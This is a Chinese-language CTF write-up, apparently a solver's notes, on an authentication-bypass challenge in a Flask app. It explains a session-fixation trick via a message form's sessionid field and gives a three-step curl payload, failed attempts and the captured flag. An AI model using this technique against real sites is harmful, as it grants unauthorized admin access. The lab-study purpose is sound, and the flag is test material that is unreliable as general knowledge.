# 认证绕过 经验积累

## 2026-03-28 | 66a3389e-51a9-42e7-9ef1-67b74b796e26.challenge.ctf.show
### 靶机环境
- Flask 应用，带登录 + message 功能
- 默认凭据: test/test
- 有 /message 表单，其中 sessionid 字段可被攻击者利用

### 成功方法
- **Session Fixation - message 表单 sessionid 字段**

### 攻击原理
服务器收到 message 后，会使用表单中 `sessionid` 参数指定的 session 值，模拟管理员访问特定页面。
攻击者利用这一点：
1. 登录获取自己的 session
2. 发送 message 时填写自己的 sessionid
3. 服务器模拟 admin 点击 → 攻击者的 session 被"提升"为 admin session
4. 刷新页面 → 攻击者以 admin 身份看到 flag

### 关键 Payload
```bash
# 1. 登录获取 session
curl -s -k -c /tmp/sess.txt "https://target/login" -X POST -d "username=test&password=test"
SESS=$(cat /tmp/sess.txt | grep session | awk '{print $7}')

# 2. 发送 message，将自己的 sessionid 告知服务器
curl -s -k -b /tmp/sess.txt "https://target/message" \
  -X POST -d "msg=hello&sessionid=${SESS}"

# 3. 刷新首页，此时 session 已具有 admin 权限
curl -s -k -b /tmp/sess.txt "https://target/"
```

### 关键特征识别
- 页面提示 "Flag in admin page"
- /message 表单中有 `sessionid` 字段（不同于 cookie）
- 登录后 session 固定，不会在 login 页面预创建

### 已尝试方法（失败）
- 直接访问 /admin, /admin.php 等 → 404
- 修改 cookie session 值为特殊字符 → session 被重置
- Session 固定后再发送 message → session 未改变

### Flag
`CTF{ctfshow_session_fixation_is_a_common_web_security_vulnerability}`

---

